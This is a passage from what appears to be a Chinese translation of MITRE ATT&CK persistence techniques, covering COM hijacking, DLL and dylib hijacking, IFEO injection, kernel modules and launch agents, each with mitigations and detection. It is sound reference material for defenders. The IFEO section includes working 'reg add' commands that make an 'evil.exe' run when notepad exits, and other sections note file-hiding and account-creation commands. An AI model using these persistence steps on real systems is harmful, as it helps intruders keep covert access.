- 该技术可能与系统固件 **System Firmware** 类似，但是可在不具有相同的完整性检查功能与级别的其他系统组件上执行。

#### 武器化

- 可以提供对系统的**持久访问级别**，但可能会出现权限维持故障和硬盘重映像等问题。
- 可以提供逃避**基于软件的防御和完整性检查**方法。
  
#### 防御方式

- 属于系统功能滥用，无法简单缓解。
  
#### 检测

- **数据和遥测(Data and telemetry)技术**：通过设备驱动程序(进程与API)使用情况、SMART(自我监控、分析和报告技术)提供的磁盘监控提供的数据和遥测(**Data and telemetry**)，检测组件的恶意操作；但如果恶意活动发生在系统组件上，或超出操作系统安全性和完整性机制的权限，此技术可能难以检测。
- **磁盘检查与电子取证工具**：可能会显示恶意固件的迹象，例如字符串，意外的磁盘分区表条目或其他异常内存块。
- **与正常镜像对比**：将组件(包括组件固件和行为的哈希值)与已知的良好镜像进行比较。

***

### Component Object Model Hijacking (COM劫持)

>[原文链接](https://attack.mitre.org/techniques/T1122/)

#### 背景

- 组件对象模型(**COM**)是Windows中的一个系统，用于通过操作系统在软件组件之间进行交互。
- 劫持COM对象需要在Windows注册表中进行更改，以替换对合法系统组件的引用，这可能导致该组件在执行时不起作用。

#### 利用场景

- 攻击者可以使用此系统来插入通过**劫持COM引用和关系**(references and relationships )作为**持久性**手段来代替合法软件，通过正常的系统操作执行该系统组件时，将改为执行攻击者的代码。
- 攻击者很可能会劫持**经常使用的对象**，以维持一致的持久性水平，但不太可能破坏系统内的显著功能，以避免系统不稳定导致异常检测。
  
#### 防御方式

- 属于系统功能滥用，无法简单缓解。
  
#### 检测手段

- **注册表**：搜索已被替换的注册表引用，即通过注册表操作将已知二进制路径替换为未知路径来检测COM劫持。
  - 即使某些第三方应用程序定义了用户COM对象，如果用户的`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\`对象在机器之前被加载，则该项中的对象有可能是可疑的，应该进行调查。
- **软件DLL负载**：检测与COM对象注册表修改相关的任何异常DLL负载

***

### Create Account (创建用户)

>[原文链接](https://attack.mitre.org/techniques/T1136/)

具有足够访问级别的攻击者可以创建本地系统或域帐户。 这些帐户可用持久化，不需要在系统上部署持久远程访问工具。

#### Windows

net user 命令可用于创建本地或域帐户。

#### Office 365

有权访问 Global Admin 帐户的对手可以创建另一个帐户，并将其分配给 Global Admin 角色，以持久访问 Office 365 账号

#### 防御方式

缓解|描述
:--:|:--
**多因素认证**|对用户和特权帐户使用多因素身份验证
**网络细分**|配置访问控制和防火墙，以限制对用于创建和管理帐户的域控制器和系统的访问
**操作系统配置**|通过确保关键服务器的正确安全配置来保护域控制器
**特权账户管理**|不允许将域管理员帐户用于日常操作，这些操作可能会使域管理员帐户暴露于非特权系统上的潜在对手

#### 检测手段

收集在网络中创建帐户时的数据。 在 Windows 系统和域控制器上创建用户帐户时生成事件 ID 4720。 定期审核域和本地系统帐户，以检测可能由攻击者创建的可疑帐户。

从云管理员帐户收集使用日志，以识别在创建新帐户并将角色分配给这些帐户时的异常活动。监视分配给管理员角色的帐户，这些帐户超过了已知管理员的特定阈值。

***

### DLL Search Order Hijacking (DLL搜索顺序劫持)

>[原文链接](https://attack.mitre.org/techniques/T1038/)

Windows 系统使用常见方法来查找需要加载到程序中的 DLL。 攻击者可以利用 Windows DLL 搜索顺序和未明确指明 DLL 的程序来提权和持久化攻击。

攻击者可以执行 DLL 预加载，也称为二进制种植攻击 。执行该攻击的方式是将与未明确的 DLL 同名的恶意 DLL 放置到某一位置，这个位置在合法 DLL 所在位置前被 Windows 搜索到。

该位置通常是程序的当前工作目录。当程序在加载 DLL 之前将其当前目录设置为远程目录（如 Web 共享），会发生远程 DLL 预加载攻击。 攻击者可能会这样做使得程序加载恶意 DLL。

攻击者还可以通过替换现有 DLL 或修改。manifest 或。local 重定向文件，目录或 Junction 来直接修改程序加载 DLL 的方式，以使程序加载不同的 DLL 以持久化攻击或提权。

如果有 DLL 搜索顺序漏洞的程序配置为在更高的权限级别运行，则加载的由攻击者控制的 DLL 也将在更高级别执行。在这种情况下，该技术可用于从用户到管理员或 SYSTEM 或从管理员到 SYSTEM 的权限升级，具体取决于程序。

被路径劫持的程序可能看起来正常，因为可以配置 恶意 DLL 使其同时加载它们所替换的合法 DLL。

#### 防御方式

缓解|描述
:--:|:--
**审计**|能够检测企业内系统上的 DLL 搜索顺序劫持机会并进行更正的审计工具。 像 PowerSploit 框架这样的工具包包含 PowerUp 模块，可用于查找系统中的 DLL 劫持缺陷
**预防执行**|使用能够审核和/或拦截未知 DLL 的白名单 工具（如 AppLocker ），识别并拦截可能通过搜索顺序劫持执行的潜在恶意软件
**限制库加载**|禁止加载远程DLL。Windows Server 2012+默认包含此功能，并且XP +和Server 2003+可以通过补丁设置路径算法</br>启用安全DLL搜索模式以强制在目录（例如%SYSTEMROOT%）之前使用更大限制（例如）的目录中搜索系统DLL（例如用户的主目录）</br>可以通过计算机配置> [策略]>管理模板> MSS（传统）上的组策略启用安全DLL搜索模式：MSS：（SafeDllSearchMode）启用安全DLL搜索模式。与此相关的Windows注册表项位于 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDLLSear`

#### 检测手段

监视文件系统中 DLL 的移动、重命名、替换或修改。 由与已知软件、补丁等无关的进程（与过去的行为相比）加载的 DLL 集中的变化都是可疑的。 监视加载到进程中的 dll 并检测文件名与其相同但路径异常的 dll。 修改或创建与软件更新无关的.manifest 和 .local 重定向文件是可疑的。

***

### Dylib Hijacking (Dylib 劫持)

>[原文链接](https://attack.mitre.org/techniques/T1157/)

macOS 和 OS X 使用一种常见的方法来查找所需的动态库 (dylib)，根据搜索路径将其加载到程序中。 攻击者可以利用有歧义的路径来植入 dylib 来提权或获得持久性。 一种常见的方法是查看应用程序使用了哪些 dylib，然后在搜索路径的上方植入一个同名的恶意版本。 这通常使 dylib 与应用程序位于同一个文件夹中。

如果程序配置为在比当前用户更高的权限级别运行，那么当 dylib 加载到应用程序中时，dylib 也将在该高权限级别运行。 这可以被攻击者用于提权。

#### 防御方式

缓解|描述
:--:|:--
**限制文件和目录权限**|设置目录访问控制，以防止在运行应用程序的文件夹和标准dylib文件夹中将文件写入应用程序的搜索路径
**用户帐号管理**|阻止用户将文件写入应用程序的搜索路径

#### 检测手段

Objective-See的Dylib劫持扫描程序可用于检测dylib劫持的潜在案例。监视文件系统以移动，重命名，替换或修改dylib。与已知软件，补丁程序等不相关的进程加载的dylib集合中的更改（与过去的行为相比）是可疑的。检查系统中是否有多个具有相同名称的dylib，并监视历史上已将哪些版本加载到进程中

***

### Emond (Emond)

>[原文链接](https://attack.mitre.org/techniques/T1519/)

攻击者可以使用事件监视器守护程序 (emond) 通过安排恶意命令在可预测的事件触发器上运行来持久化。**Emond** 是一个 [**启动守护程序**](#launch-daemon-%e5%90%af%e5%8a%a8%e5%ae%88%e6%8a%a4%e8%bf%9b%e7%a8%8b) (T1160)，它接受来自各种服务的事件，通过简单的规则引擎运行它们并采取行动。**emond** 的二进制文件 `/sbin/emond` 将加载 `/etc/emond.d/rules/` 目录中的所有规则，并在发生明确定义的事件后立即采取措施。规则文件为plist格式，并定义名称，事件类型和要执行的操作。事件类型的一些示例包括系统启动和用户身份验证。操作示例是运行系统命令或发送电子邮件。如果 `/private/var/db/emondClients` 在启动守护程序中 (T1160)指定的 **QueueDirectories** 路径中没有文件，则 **emond** 服务将不会启动的配置文件 `/System/Library/LaunchDaemons/com.apple.emond.plist`

攻击者可以通过编写规则来在发生定义的事件  (例如系统启动或用户身份验证) 时执行命令来滥用此服务。当emond服务由启动守护程序(T1160)服务以root特权执行时，攻击者也可以将特权从管理员升级到roots

#### 防御方式

缓解|描述
:--:|:--
**禁用或删除功能或程序**|删除启动守护进程来禁用emond

#### 检测手段

通过检查在 `/etc/emond.d/rules/` 和 `/private/var/db/emondClients` 创建和修改的文件来监视emond规则的创建

***

### External Remote Services

>同 [**外部远程服务**](#external-remote-services-%e5%a4%96%e9%83%a8%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1)

***

### File System Permissions Weakness (文件系统权限缺失)

>[原文链接](https://attack.mitre.org/techniques/T1044/)

进程可以自动执行特定二进制文件作为其功能的一部分，或执行其他操作。如果对包含目标二进制文件的文件系统目录的权限或对二进制文件本身的权限设置不正确，则目标二进制文件可能会被另一个使用用户级权限的二进制文件覆盖并由原始进程执行。如果原始进程和线程在更高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，其中可能包括 SYSTEM。 攻击者可以使用此技术将合法二进制文件替换为恶意二进制文件，作为在更高权限级别执行代码的方法。如果将进程设置为在特定时间或某个特定事件  (例如，系统启动) 期间运行，则该技术也可用于持久化。

#### 服务

操作 Windows 服务二进制文件是此技术的一种变体。攻击者可以用自己的可执行文件替换合法的服务可执行文件，以获得持久性和/或提权到服务运行所需的帐户上下文。  (本地/域帐户，SYSTEM，LocalService 或 NetworkService) 一旦服务被启动，不管由用户直接启动  (如果有合适的访问) 或通过其他方式，例如系统重启时启动服务，都将运行替换的可执行文件，而不是原来的可执行服务。

#### 可执行的安装程序

这种技术的另一种变体利用可执行的自解压安装程序的常见缺陷。在安装过程中，安装程序通常使用 `%TEMP%` 目录下的子目录来解压缩二进制文件，例如 DLL，EXE 或其他有效载荷。当安装程序创建子目录和文件时，通常没有设置适当的权限来限制写入，这使子目录中的不受信代码得以执行或安装时使用的二进制文件被覆盖。这种行为可以利用 DLL 搜索顺序劫持。一些安装程序可能需要更高的权限，这将导致执行攻击者控制的代码时被提权。该行为与绕过用户帐户控制有关。一些存在该缺陷的现有通用安装程序的例子已经报告给软件供应商。

#### 防御方式

缓解|描述
:--:|:--
**审计**|使用能够检测企业系统中文件系统权限滥用缺陷的审计工具并进行更正。像 PowerSploit 框架这样的工具包包含 PowerUp 模块，可以使用这些模块查找系统中的服务文件系统权限缺陷
**用户账号控制**|关闭 UAC 的标准用户的提权 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]自动拒绝提权请求，添加：`"ConsentPromptBehaviorUser"=dword:00000000 . "`考虑通过添加以下内容为所有用户启用安装程序检测：`"EnableInstallerDetection"=dword:00000001.` 。这将提示用户输入安装密码并记录。要禁用安装程序检测，改为： `"EnableInstallerDetection"= dword:00000000`。这可以防止通过漏洞利用在 UAC 检测安装程序的过程中潜在地提升权限，但将允许安装过程在不被记录的情况下继续
**用户账号管理**|制用户帐户和组的权限，以便只有授权的管理员才能与服务更改和服务二进制目标路径位置进行交互

#### 检测手段

查找通常在软件更新期间可能发生的对二进制文件和服务可执行文件的更改。如果编写、重命名和/或移动可执行文件以匹配现有的服务可执行文件，则可以检测到该可执行文件并将其与其他可疑行为相关联。二进制文件和服务可执行文件的散列可用于检测历史数据的替换。 

从典型进程和服务中查找异常流程调用树，并查找可能与发现  (Discovery) 或其他攻击技术相关的其他命令的执行。

***

### Hidden Files and Directories (隐藏的文件与目录)

>[原文链接](https://attack.mitre.org/techniques/T1158/)

为了防止普通用户意外更改系统上的特殊文件，大多数操作系统都具有 **隐藏** 文件的概念。当用户使用GUI浏览文件系统或在命令行上使用常规命令时，这些文件不会显示.用户必须通过一系列图形用户界面  (GUI) 提示或使用命令行开关  (dir /a Windows下的 `dir /a` 以及Linux和macOS下的 `ls -a`) 明确要求显示隐藏文件。

攻击者可以利用它的优势来隐藏系统上任何位置的文件和文件夹，以实现持久化，并逃避不包含对隐藏文件的调查的典型用户或系统分析。

#### Windows

用户可以使用 `attrib.exe` 将特定文件标记为s隐藏，`attrib +h filename`。同样的， `+ s`标记为系统文件，`+ r`标记为只读文件。像大多数 Windows二进制文件一样，`attrib.exe` 二进制文件提供了 `/ S` 递归应用这些更改的功能。

#### Linux/Mac

用户只需将 `.`标记为隐藏即可将其标记为隐藏。作为文件或文件夹名称的第一个字符 。默认情况下，以 `.` 开头的文件和文件夹在Finder应用程序和标准命令行实用程序  (如 `ls` ) 中不会隐藏。用户必须专门更改设置才能查看这些文件。对于命令行用法，通常会有一个标志来查看所有文件  (包括隐藏文件) 。要在 **Finder** 应用程序中查看这些文件，必须执行以下命令：`defaults write com.apple.finder AppleShowAllFiles YES`，然后重新启动 **Finder** 应用程序。

#### Mac

可以使用 `UF_HIDDEN` 标志标记 **macOS** 上的文件，这可以防止在Finder.app中看到它们，但仍然允许在 **Terminal.app** 中看到它们。许多应用程序都会创建这些隐藏的文件和文件夹来存储信息，以便不会使用户的工作区杂乱无章。例如，**SSH** 实用程序创建一个 **.ssh** 文件夹，该文件夹已隐藏并且包含用户的已知主机和密钥。

#### 防御方式

- 这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能

#### 检测手段

监视文件系统和Shell命令，以查找带有前导 `.` 的文件 , Windows命令行使用attrib.exe 添加隐藏属性

***

### Hooking (Hooking)

>[原文链接](https://attack.mitre.org/techniques/T1179/)

Windows 进程通常利用应用程序编程接口 (API) 函数来执行需要可重用系统资源的任务。Windows API 函数通常作为导出函数存储在动态链接库 (DLL)中。Hook 涉及将调用重定向到这些功能，可以通过以下方式实现：

- hook 程序，它拦截并执行指定的代码以响应诸如消息，击键和鼠标输入之类的事件
- 导入地址表 (IAT) hook，它修改进程的 IAT，其中存储指向导入的 API 函数的指针
- 内联hook，它覆盖 API 函数中的第一个字节以重定向代码流

与 [**进程注入**](#process-injection-%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5)，攻击者可以使用 hook 在另一个进程的上下文中加载和执行恶意代码，秘密执行的同时还可以访问进程的内存和潜在的高级权限。当通过正常使用调用函数时，安装 hook 机制也可以通过连续调用提供持久化。

恶意 hook 机制还可以捕获 API 调用，其中包含显示 Credential Access 的用户身份验证凭据的参数。

[**Rootkit**](#rootkit-rootkit) 通常使用 hook 来隐藏文件，进程，注册表项和其他对象，以隐藏恶意软件和相关行为。

#### 防御方式

这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能。

#### 检测手段

监视对 SetWindowsHookEx 和 SetWinEventHook 函数的调用，这些函数安装了一个钩子过程。还要考虑使用工具或通过编程方式检查内部内核结构来分析钩链  (其中包含指向每种类型 hook 的 hook 流程的指针) 。

Rootkits 探测器也可用于监控各种类型的 hook 活动。

通过将内存中的代码与相应的静态二进制代码进行比较来校验实时进程的完整性，特别是检查跳转和重定向代码流的其他指令。还要考虑拍摄新启动的进程的快照， 以将内存中的 IAT 与引用函数的实际地址进行比较。

分析进程行为以确定进程是否正在执行通常不执行的操作，例如打开网络连接，读取文件或可能与泄密后行为相关的其他可疑操作。

***

### Hypervisor (管理程序)

>[原文链接](https://attack.mitre.org/techniques/T1062/)

Type-1 Hypervisor 位于客户操作系统和系统硬件之间的软件层。它为操作系统提供了一个虚拟的运行环境。常见 hypervisor 的例子是 Xen。 Type-1 Hypervisor 的操作级别低于操作系统，设计时可添加 [**Rootkit**](#rootkit-rootkit) 功能，以向客户操作系统隐藏它的存在。 该类型的恶意 hypervisor 可以通过中断在系统上实现持久化。

#### 防御方式

- 这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能。

#### 检测手段

Type-1 Hypervisor 可以通过执行定时分析来检测。Hypervisor 模拟某些通常由硬件执行的 CPU 指令。如果一条指令在不应该包含 hypervisor 的系统上执行的时间比正常时间长几个数量级，则可能存在 hypervisor。

***

### Image File Execution Options Injection (图像文件执行选项注入)

>[原文链接](https://attack.mitre.org/techniques/T1183/)

图像文件执行选项 (IFEO) 使开发人员可以将调试器附加到应用程序。创建进程后，应用程序IFEO中存在的调试器将以该应用程序的名称为前缀，从而在调试器下有效地启动新进程 (例如，`C:\dbg\ntsd.exe -g notepad.exe`)。

IFEO可以通过注册表直接设置，也可以通过GFlags工具在全局标志中设置。IFEOS在注册表 `HKLM\SOFTWARE{{\Wow6432Node}}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\` 以 `Debugger` 表示在调试器二进制文件所在位置。

当指定的程序无提示退出时  (即，它本身或第二个非内核模式进程过早终止) ，IFEO还可以使任意监视程序启动。与调试器类似，可以通过 GFlags **和/或** 通过直接修改IEFO和中的静默进程出口注册表值来启用静默监视位于`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\`

退出 **notepad.exe** 时启动 **evil.exe** 进程的示例：

- `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512`
- `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1`
- `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"`

与 [**进程注入**](#process-injection-%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5)类似，通过使恶意可执行文件在计算机上独立进程的上下文中加载并运行，这些值可能会被滥用以获取持久化和提权。安装IFEO机制还可以通过连续调用来提供持久化。

恶意软件还可能通过注册无效的调试器来重定向防御，并有效地禁用各种系统和安全应用程序，从而将IFEO用于防御。

#### 防御方式

- 这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能。

#### 检测手段

监视异常父项下 **和/或** 带有指示调试的创建标志的常见进程，例如`DEBUG_PROCESS` 和 `DEBUG_ONLY_THIS_PROCESS`。

监视与IFEO相关的注册表值以及静默进程退出监视，以进行与已知软件，补丁程序周期等不相关的修改。监视和分析指示注册表编辑的应用程序编程接口  (API) 调用，例如`RegCreateKeyEx` 和 `RegSetValueEx`。

***

### Implant Container Image (容器映像植入)

>[原文链接](https://attack.mitre.org/techniques/T1525/)

可以植入或后门安装 Amazon Web Service  (AWS) Amazon Machine Images  (AMI) ，Google Cloud Platform  (GCP) 映像和Azure映像以及流行的容器运行时  (例如Docker) 以包含恶意代码。根据基础结构的配置方式，如果指示基础结构配置工具始终使用最新映像，则可以提供持久化。

已经开发了一种工具来促进在云容器图像中种植后门。如果攻击者有权访问受感染的AWS实例，并且有权列出可用的容器映像，则他们可能会植入后门，例如Web Shell。[1]攻击者还可能植入可能在云部署中无意中使用的Docker映像，这在某些加密挖矿僵尸网络实例中已有报道。

#### 防御方式

缓解|描述
:--:|:--
**审计**|定期检查云部署中使用的映像和容器的完整性，以确保未对其进行修改以包括恶意软件
**代码签名**|一些云服务提供商支持内容信任模型，这些模型要求容器映像由受信任的源签名
**特权账户管理**|根据最小特权原则，限制与创建和修改平台映像或容器相关的权限

#### 检测手段

监视用户与图像和容器的交互，以识别异常添加或修改的图像和容器。

***

### Kernel Modules and Extensions (内核模块与扩展)

>[原文链接](https://attack.mitre.org/techniques/T1215/)

可加载内核模块 (LKMs) 是可以根据需要加载和卸载到内核中的代码片段。 它们不需要重启系统即可扩展内核的功能。 例如，设备驱动程序是一类模块，它使内核可以访问连接到系统的硬件。 恶意使用时，可加载内核模块 (LKM) 可以是一种内核模式的 Rootkit，具有最高的操作系统特权 (Ring 0)。 攻击者可以利用可加载内核模块来隐秘地在系统上实现持久化，并规避防御。 在民间已经发现了一些例子，并且有一些开源项目。

基于 LKM 的 rootkit 的常见特性包括：隐藏自身、选择性地隐藏文件、进程和网络活动，以及篡改日志，提供经过身份验证的后门，并允许非特权用户启用 root 访问权限。

内核扩展，也称为 kext，在 macOS 中用于将功能加载到系统，类似于 Linux 的 LKM。 它们通过 `kextload` 和 `kextunload` 命令进行加载和卸载。

#### 防御方式

缓解|描述
:--:|:--
**防病毒/反恶意软件**|用于检测Linux rootkit的常见工具包括：rkhunter，chrootkit，尽管rootkit可能被设计为逃避某些检测工具
**预防执行**|应用程序白名单和软件限制工具  (例如SELinux) 也可以帮助限制内核模块的加载
**特权账户管理**|限制对root帐户的访问，并通过适当的特权分离和限制提权机会来防止用户加载内核模块和扩展

#### 检测手段

从 Linux 内核版本 2.6 开始，LKM 通常被加载到 `/lib/modules` 并具有扩展名 .ko  (`kernel object`) 中。

许多 LKM 需要 Linux 头文件  (特定于目标内核) 才能正确编译。 这通常通过操作系统包管理器获得，并像普通包一样安装。 攻击者可能会在加载恶意模块之前在目标系统上运行这些命令，以确保它被正确编译。

对于 Ubuntu 和 Debian 的系统上，这可以通过运行：`apt-get install linux-headers-$(uname -r)` 来完成

对于 RHEL 和 CentOS 的系统上，这可以通过以下方式实现：`yum install kernel-devel-$(uname -r)`

通过监视以下命令，可以检测 Linux 系统上的加载、卸载和操作模块：`modprobe insmod lsmod rmmod modinfo`

对于 macOS，监视 kextload 命令的执行，并与其他未知或可疑的活动相关联。

***

### Launch Agent (启动代理)

>[原文链接](https://attack.mitre.org/techniques/T1159/)

苹果的开发者文档，每个用户的桌面进程启动用户登录其负载从属性列表中的每个发射点播用户代理的参数中发现的  (plist) 文件 `/System/Library/LaunchAgents`，`/Library/LaunchAgents和$HOME/Library/LaunchAgents`。这些启动代理具有指向将要启动的可执行文件的属性列表文件。

攻击者可能会安装新的启动代理，该启动代理可以配置为在登录时执行，方法是使用**launchd** 或 **launchctl** 将 **plist** 加载到适当的目录中 。可以使用相关操作系统或良性软件中的名称来伪装代理名称。启动代理是使用用户级特权创建的，并在他们登录时以用户特权执行。可以将它们设置为在特定用户登录时  (在特定用户的目录结构中) 或任何用户登录时  (需要管理员权限) 执行。

#### 防御方式

缓解|描述
:--:|:--
**用户帐号管理**|限制用户使用组策略创建启动代理的能力

#### 检测手段

通过其他plist文件和实用程序  (例如Objective-See的KnockKnock应用程序) 监视Launch Agent的创建。启动代理还要求磁盘上的文件具有持久性，也可以通过其他文件监视应用程序对其进行监视。

***

### Launch Daemon (启动守护进程)

>[原文链接](https://attack.mitre.org/techniques/T1160/)

根据Apple的开发人员文档，当启动macOS和OS X时，将运行启动来完成系统初始化。该过程从 `/System/Library/LaunchDaemons`和 `/Library/LaunchDaemons` 中找到的属性列表  (plist) 文件中为每个按需启动系统级守护程序加载参数。这些LaunchDaemons具有属性列表文件，这些文件指向将要启动的可执行文件。

攻击者可以安装新的启动守护程序，该启动守护程序可以配置为在启动时执行，方法是使用launchd或launchctl将plist加载到适当的目录中。可以使用来自相关操作系统或良性软件的名称来伪装该守护程序名称 。启动守护程序可以使用管理员特权创建，但是在root特权下执行，因此攻击者还可以使用服务将特权从管理员升级到root。

plist文件的权限必须是 root：wheel，但是它指向的脚本或程序没有这样的要求。因此，不良配置有可能使攻击者修改当前的启动守护程序的可执行文件并获得持久性或提权。

#### 防御方式

缓解|描述
:--:|:--
**用户帐号管理**|限制用户帐户的特权并修复提权向量，以便只有授权的管理员才能创建新的启动守护程序

#### 检测手段

通过其他plist文件和实用程序  (例如Objective-See的Knock Knock应用程序) 监视Launch Daemon的创建。

***

### Launchctl

>同 [Launchctl](#launchctl-macos)

***

### LC_LOAD_DYLIB Addition (LC_LOAD_DYLIB附加)

>[原文链接](https://attack.mitre.org/techniques/T1161/)

Mach-O二进制文件具有一系列标头，这些标头用于在加载二进制文件时执行某些操作。Mach-O二进制文件中的LC_LOAD_DYLIB标头告诉macOS和OS X在执行期间要加载哪些动态库  (dylib) 。这些可以自组织只要调整到的字段和依赖性的其余部分由被添加到已编译的二进制。有一些工具可以执行这些更改。任何更改都会使二进制文件上的数字签名无效，因为正在修改二进制文件。攻击者可以通过简单地从二进制文件中删除LC_CODE_SIGNATURE命令来补救此问题，以便在加载时不检查签名。

#### 防御方式

缓解|描述
:--:|:--
**审计**|还可以将二进制文件作为其所需的动态库的基准，如果应用程序需要一个未包含在更新中的新动态库，则应进行调查
**代码签名**|强制所有二进制文件由正确的Apple Developer ID签名
**预防执行**|通过已知哈希将应用列入白名单

#### 检测手段

监视进程中可能用于修改二进制头的进程。监视文件系统，以知晓对应用程序二进制文件的更改以及无效的校验和/签名。与应用程序更新或补丁不匹配的二进制文件更改也非常可疑

***

### Local Job Scheduling

>同 [本地作业调度](#local-job-scheduling-%e6%9c%ac%e5%9c%b0%e4%bd%9c%e4%b8%9a%e8%b0%83%e5%ba%a6)

***

### Login Item (登录项)

>[原文链接](https://attack.mitre.org/techniques/T1162/)

MacOS提供了列出用户登录时要运行的特定应用程序的选项。这些应用程序在登录用户的上下文中运行，并且将在用户每次登录时启动。使用 **服务管理框架** 安装的登录项在菜单中不可见。系统偏好设置，只能由创建它们的应用程序删除。用户可以直接控制使用共享文件列表安装的登录项目，这些文件也可以在 **系统偏好设置** 中看到。这些登录项目存储在用户 `~/Library/Preferences/` 目录的 **plist** 文件中，文件名为 **com.apple.loginitems.plist**。其中一些应用程序可以为用户打开可见的对话框，但是由于可以 **隐藏** 窗口，因此不必全部打开。如果攻击者可以注册自己的登录项或修改现有的登录项，则每次用户登录时，他们都可以使用它来为持久性机制执行其代码。API方法 `SMLoginItemSetEnabled` 可用于设置登录项，但是脚本语言  (如AppleScript) 也可以做到这一点。

#### 防御方式

缓解|描述
:--:|:--
**用户帐号管理**|限制用户能够创建自己的登录项目
**用户培训**|	登录期间按住Shift键可防止应用自动打开

#### 检测手段

通过苹果菜单->系统偏好设置->用户和组->登录项目，可以查看通过共享文件列表创建的所有登录项目。对于已知的良好应用，应监视该区域  (以及相应的文件位置) 并将其列入白名单。否则，登录项位于 `Contents/Library/LoginItems` 应用程序捆绑包内，因此也应监视这些路径。监视由登录操作导致的异常或未知应用程序的流程执行。

***

### Logon Scripts (登录脚本)

>[原文链接](https://attack.mitre.org/techniques/T1037/)

#### Windows

Windows 允许特定用户或用户组登录系统时运行登录脚本。 脚本可用于执行管理功能，这些功能通常需要执行其他程序或将信息发送到内部日志记录服务器。

如果攻击者有权限访问这些脚本，他们可以在登录脚本中插入其他代码，以便在用户登录时执行他们的工具。如果该脚本是本地的，这段代码可以让他们在单个系统上实现长久控制。如果脚本存储在中央服务器上并被推送到许多系统，那么这样做可以帮助攻击者在网络横向移动。访问登录脚本可能需要本地凭据或管理员帐户，这取决于脚本的访问配置。

#### Mac

只要特定用户登录或退出系统，Mac 就允许以 root 身份运行登录和注销钩子。登录钩子告知 Mac OS X 在用户登录时应执行哪一脚本，与启动项不同的是，登录钩子以 root 身份执行 。但是一次只能执行一个登录钩子。如果攻击者有权限访问这些脚本，他们可以在脚本中插入其他代码，以便在用户登录时执行攻击者的工具。

#### 防御方式

缓解|描述
:--:|:--
**限制文件和目录权限**|将登录脚本的写访问权限限制为特定管理员

#### 检测手段

监视登录脚本是否有异常用户或在异常时间的异常访问。 查找由正常管理职责之外的异常帐户添加或修改的文件。

***

### LSASS Driver

>同 [LSASS驱动程序](#lsass-driver-lsass%e9%a9%b1%e5%8a%a8%e7%a8%8b%e5%ba%8f)

***

### Modify Existing Service (修改现有服务)

>[原文链接](https://attack.mitre.org/techniques/T1031/)

Windows 服务配置信息  (包括服务的可执行文件或恢复程序/命令的文件路径) 存储在注册表中。可以使用 sc.exe 和 Reg 等工具修改服务配置。

攻击者可以使用系统或自定义工具与 Windows API 进行交互来修改现有服务，从而在系统上保留恶意软件。使用现有服务是一种伪装方式，可能使检测分析更难。修改现有服务可能会停止其功能，或者可能启用已被禁用或不常用的服务。

攻击者还可能故意破坏或终止服务以执行恶意恢复程序/命令。

#### 防御方式

缓解|描述
:--:|:--
**审计**|使用能够检测企业系统中特权和服务滥用机会并对其进行纠正的审核工具
**用户帐号管理**|限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务配置进行交互

#### 检测手段

查找与已知软件、补丁周期等不相关的服务注册表项的更改。如果通常没有将二进制路径和服务启动类型从手动或禁用更改为自动，那么这样做是可疑的。 诸如 Sysinternals Autoruns 之类的工具也可以用于检测尝试建立持久性导致的系统更改。

服务信息存储在注册表中 `HKLM\SYSTEM\CurrentControlSet\Services`。 能够修改服务的工具的命令行调用可能不常见，具体取决于系统在特定环境中的使用方式。 收集用于分析的服务的实用程序执行和服务的二进制路径参数。 甚至可以更改服务二进制路径以执行 cmd 命令或脚本。 从已知服务中查找异常流程调用树，并查找可能与披露  (Discovery) 或其他攻击技术相关的其他命令的执行。 还可以通过 Windows 系统管理工具  (如 Windows 管理规范和 PowerShell) 修改服务，因此可能需要配置其他日志以收集适当的数据。

***

### Netsh Helper DLL (Netsh Helper DLL)

>[原文链接](https://attack.mitre.org/techniques/T1128/)

**netsh.exe**  (也称为 Netshell) 是一个命令行脚本工具，用于与系统的网络配置进行交互。 它可以添加 helper DLL，从而扩展实用程序的功能。 注册 **netsh.exe** helper DLL 的路径会保存到 Windows 注册表的 `HKLM\SOFTWARE\Microsoft\Netsh` 中。 当利用另一种持久化技术自动执行 **netsh.exe** 或者系统上存在其他将执行 **netsh.exe** 作为其正常的一部分的持久化软件时， 攻击者可以利用带有 helper DLL 的 **netsh.exe** 持久地代理执行任意代码。 示例包括一些调用 **netsh.exe** 的 VPN 软件。

存在使用 **netsh.exe** helper DLL 加载 Cobalt Strike 的 exp 。

#### 防御方式

- 这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能。

#### 检测手段

在大多数环境中，net.exe 拥有子进程一般是不正常的。 监视进程执行情况，并调查由 net.exe 生成的每个子进程以确定恶意行为。 监视 `HKLM\SOFTWARE\Microsoft\Netsh` 的注册表项，以查找与已知系统文件或良性软件无关的任何新条目或可疑条目。

***

### New Service (新建服务)

>[原文链接](https://attack.mitre.org/techniques/T1050/)

